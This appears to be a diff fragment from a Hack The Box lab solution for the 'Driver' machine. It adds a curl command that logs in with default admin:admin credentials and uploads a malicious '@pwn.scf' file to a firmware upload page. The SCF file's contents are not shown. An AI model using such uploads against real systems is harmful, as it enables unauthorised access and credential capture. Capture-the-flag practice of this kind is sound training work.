@@ -1,0 +1,4 @@
+curl -u admin:admin \
+  -F "printers=HTB DesignJet" \
+  -F "firmware=@/root/htbmachines/windows/easy/driver/@pwn.scf" \
+  http://driver.htb/fw_up.php
